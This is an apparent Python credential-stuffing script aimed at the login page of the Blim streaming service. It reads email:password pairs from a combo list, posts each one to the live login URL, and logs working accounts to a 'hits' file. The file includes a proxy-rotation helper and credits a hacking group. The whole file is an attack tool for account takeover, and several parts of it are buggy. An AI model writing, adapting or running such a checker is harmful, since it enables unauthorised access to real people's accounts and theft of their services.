import requests
from bs4 import BeautifulSoup
import threading
import os as a
from random import choice
import colorama
from time import sleep
from colorama import init
init()
from colorama import Fore, Back, Style


banner="""__              ____                    __ 
  / /  ___ _    __/ / /__ _    _________ _/ /_
 / _ \/ _ \ |/|/ / / / _ \ |/|/ / __/ _ `/ __/
/_//_/\___/__,__/_/_/\___/__,__/\__/\_,_/\__/                       """


a.system("cls")
class good_or_bad(object):
	def tellmewhatis(self,email,password,caso):
		if caso == True:
			
			print(Fore.BLUE + Back.GREEN+ f"[+]CUENTA VALIDA: {email}:{password}")
			print(f"""BLIM ACCCOUNT
e = {email}
p = {password}		
CHECKER BY PANDORA BOX HACKING GROUP
HOLLOWCAT AND FUCKED UP

""",file=open("Blim_HITS.txt","a"))
			
		elif caso == False:
			
			print(Fore.RED + Back.YELLOW+ f"[-]CUENTA INVALIDA: {email}:{password}")
			print(f"""{email}:{password}""",file=open("bad.txt","a"))
			
class post(object):
	def proxies(self):
		try:
			file = open("proxy_lives.txt").readlines()
			file_lines = [proxies.rstrip()for proxies in file]
			result = {"https":"http://"+choice(file_lines)}
			return result
		except:
			print("PROXY ERROR")
	def request(self,email,password):
		url = "https://www.blim.com/account/login"
		bad = open("bad.txt","r+")
		good = open("Blim_HITS.txt","r+")
		goods = good.read()
		bads = bad.read()
		req = requests.session()
		stop = "default@gmail.com"
		
		
		if  email in bads:
			os.system("^Z")
			os.system("^C")

			
		elif email  in goods:
			
			os.system("^Z")
			os.system("^C")
		
		else:
			req = requests.Session()
			proxy = self.proxies()
			
			param={
			"username":email,
			"password":password

			}
			
			source = req.post(url,data=param,timeout=4)

			if """{"data":{"redirectPath":"\/inicio"},"messages":[]}""" in source.text:
				good_or_bad().tellmewhatis(email,password,caso=True)
				
			else:
				good_or_bad().tellmewhatis(email,password,caso=False)
			
				
			if email in stop:
				sleep(10)
				print("TODAS LAS CUETNAS HAN SIDO PROBADAS")
				os.system("^Z")
				os.system("^C")		

		

class x(object):
		
	def load(self,b):
		file = open("combo.txt","r")
		try:
				
			file_lines = file.readlines()[b]
			combo = file_lines.rstrip()
			combos = combo.split(":")
			self.check(combos)
		except:
			pass


	def check(self,acc):
		
		try:
			email = acc[0]
			password = acc[1]
			
		#print (self.load())
		except:
			pass
		while True:
			try:
				
				post().request(email,password)
				
				
				
			except  Exception:
				
				break
	def main(self):
		print("""++++++++++++++++++++CONFIG BY: ++++++++++++++++++""")
		print(Fore.GREEN+Back.BLACK+banner)
		a = open("combo.txt","r")
		s = len(a.readlines())
		for b in range(s):
			w = threading.Thread(target=self.load(b))
			w.start()
		
if __name__ == '__main__':
	x().main()